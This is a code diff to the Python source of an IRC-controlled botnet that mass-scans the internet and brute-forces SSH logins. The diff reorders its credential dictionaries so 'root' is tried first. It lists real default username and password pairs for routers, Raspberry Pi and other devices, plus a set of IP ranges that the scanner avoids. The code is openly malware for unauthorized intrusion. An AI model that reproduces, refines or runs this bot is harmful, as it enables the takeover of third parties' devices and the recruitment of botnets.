@@ -44,7 +44,6 @@ If the bot has a nick of 'spag-tnnxu', the id of that bot is 'tnnxu'.
 You can issue a command with '@info all', or '@info tnnxu'.
 
 Bugs:
-- Using combos.keys() is in ABC order and not testing 'root' first.
 - The @stop command is not perfect and doesn't fully stop scans in progress.
  
 Todo:
@@ -68,6 +67,7 @@ import sys
 import threading
 import time
 import urllib2
+from collections import OrderedDict
 
 # IRC Config (EDIT)
 server   = 'irc.server.com'
@@ -83,33 +83,33 @@ control_char = '@'
 throttle     = 20
 
 # SSH Login Combos
-combos = {
-    'root'      : ('root','toor','admin','changeme','pass','password','1234','12345','123456'),
-    'admin'     : ('1234','12345','123456','4321','9999','abc123','admin','changeme','admin123','password'),
-    'cisco'     : 'cisco',
-    'pi'        : 'raspberry'
-}
+combos = OrderedDict([
+    ('root',  ('root','toor','admin','changeme','pass','password','1234','12345','123456')),
+    ('admin', ('1234','12345','123456','4321','9999','abc123','admin','changeme','admin123','password'))
+])
 
-deep_combos = {
-    'root'      : ('alien','alpine','calvin','kn1TG7psLu','logapp','openelec','pixmet2003','raspberrypi','rasplex','rootme','soho','TANDBERG','trendimsa1.0'),
-    'admin'     : ('aerohive','kn1TG7psLu','TANDBERG'),
-    'alien'     : 'alien',
-    'bitnami'   : 'bitnami',
-    'device'    : 'apc',
-    'dpn'       : 'changeme',
-    'HPSupport' : 'badg3r5',
-    'lp'        : 'lp',
-    'master'    : 'themaster01',
-    'osmc'      : 'osmc',
-    'plexuser'  : 'rasplex',
-    'sysadmin'  : 'PASS',
-    'toor'      : 'logapp',
-    'ubnt'      : 'ubnt',
-    'user'      : ('acme','live'),
-    'vagrant'   : 'vagrant',
-    'virl'      : 'VIRL',
-    'vyos'      : 'vyos'
-}
+deep_combos = OrderedDict([
+    ('root',      ('alien','alpine','calvin','kn1TG7psLu','logapp','openelec','pixmet2003','raspberrypi','rasplex','rootme','soho','TANDBERG','trendimsa1.0')),
+    ('admin',     ('aerohive','kn1TG7psLu','TANDBERG')),
+    ('alien',     'alien'),
+    ('bitnami',   'bitnami'),
+    ('cisco',     'cisco'),
+    ('device',    'apc'),
+    ('dpn',       'changeme'),
+    ('HPSupport', 'badg3r5'),
+    ('lp',        'lp'),
+    ('master',    'themaster01'),
+    ('osmc',      'osmc'),
+    ('pi',        'raspberry'),
+    ('plexuser',  'rasplex'),
+    ('sysadmin',  'PASS'),
+    ('toor',      'logapp'),
+    ('ubnt',      'ubnt'),
+    ('user',      ('acme','live')),
+    ('vagrant',   'vagrant'),
+    ('virl',      'VIRL'),
+    ('vyos',      'vyos')
+])
 
 # Important Ranges (DO NOT EDIT)
 spooky   = ('11','21','22','24','25','26','29','49','50','55','62','64','128','129','130','131','132','134','136','137','138','139','140','143','144','146','147','148','150','152','153','155','156','157','158','159','161','162','163','164','167','168','169','194','195','199','203','204','205','207','208','209','212','213','216','217','6','7')
